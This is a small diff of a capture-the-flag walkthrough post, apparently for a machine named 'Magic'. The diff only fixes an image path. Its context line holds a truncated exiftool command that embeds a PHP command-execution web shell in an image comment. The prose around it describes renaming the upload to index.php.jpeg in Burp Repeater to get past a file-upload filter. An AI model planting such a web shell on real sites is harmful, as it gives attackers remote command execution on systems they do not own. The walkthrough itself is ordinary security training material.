@@ -67,4 +67,4 @@ exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_RE
 
 Once I uploaded, I used BURP to intercept the image file, and sent to repeater. Once in repeater, I changed the filename to index.php.jpeg and sent the POST forward:
 
-<img src="../images/posts/magic_walkthrough/burp_repeater.png" alt="burp_repeater">
+<img src="images/posts/magic_walkthrough/burp_repeater.png" alt="burp_repeater">
